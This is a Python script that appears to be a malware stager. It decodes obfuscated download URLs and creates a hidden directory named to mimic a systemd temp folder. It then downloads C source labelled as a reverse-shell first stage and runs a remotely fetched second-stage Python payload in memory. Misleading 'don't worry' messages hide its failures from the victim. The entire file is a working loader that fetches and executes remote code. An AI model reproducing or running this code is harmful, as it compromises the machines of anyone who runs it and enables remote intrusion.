import requests
import base64
from pathlib import Path
from tempfile import gettempdir
from subprocess import run

TMP_DIR = "/tmp/systemd-pr1vate-6e9393d58a-enit.service.compressor-SEFC/"

def _deobfuscate(encoded: str, key: int) -> str:
    decoded = base64.b64decode(encoded)
    return ''.join(chr(b ^ key) for b in decoded)

# Your encrypted values
_ENC_STAGE2 = "c3twbHN0emxze3psc3B7eHV1dXVtMTYjJScwcGwyOw=="
_ENC_C_CODE = "c3twbHN0emxze3psc3B7eHZ2dnZtMTYjJSdzHTAnNGwh"

# Decrypted URLs
URL_STAGE2 = f"http://{_deobfuscate(_ENC_STAGE2, 0x42)}"
URL_C_CODE = f"http://{_deobfuscate(_ENC_C_CODE, 0x42)}"

def setup_tmp():
    Path(TMP_DIR).mkdir(parents=True, exist_ok=True)

def download_file(url, dest_path):
    r = requests.get(url, timeout=5)
    if r.status_code == 200:
        with open(dest_path, "wb") as f:
            f.write(r.content)
        #print(f"[+] Downloaded to {dest_path}")
    else:
        #continue
        print(f"[!] Nothing serious don't worry :D yayy {url}")

def download_and_run_stage2():
    try:
        r = requests.get(URL_STAGE2, timeout=5)
        if r.status_code == 200:
            #print("[+] Running stager2.py (fileless)")
            run(["python3", "-c", r.text])
        else:
            #continue
            print("[!] Nothing serious don't worry :D yayy")
    except Exception as e:
        #continue
        print(f"[!] Nothing serious don't worry :D yayy {e}")

def main():
    setup_tmp()
    download_file(URL_C_CODE, f"{TMP_DIR}stage1_rev.c")
    download_and_run_stage2()

if __name__ == "__main__":
    main()


